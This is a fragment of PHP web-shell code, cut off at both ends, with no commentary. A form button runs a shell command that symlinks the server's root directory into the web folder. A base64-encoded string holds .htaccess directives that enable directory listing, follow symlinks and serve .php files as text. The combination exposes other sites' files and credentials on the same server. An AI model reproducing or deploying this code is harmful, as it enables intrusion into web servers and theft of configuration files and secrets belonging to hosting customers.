...
<center><input type='submit' value='ewe' name='fsdth'></center>"; 
if (isset($_POST['fsdth'])){ system('ln -s / fsdth.txt'); 
$x = 'T3B0aW9ucyBJbmRleGVzIEZvbGxvd1N5bUxpbmtzDQpEaXJlY3RvcnlJbmRleCBzc3Nzc3MuaHRtDQpBZGRUeXBlIHR4dCAucGhwDQpBZGRIYW5kbGVyIHR4dCAucGhw'; 
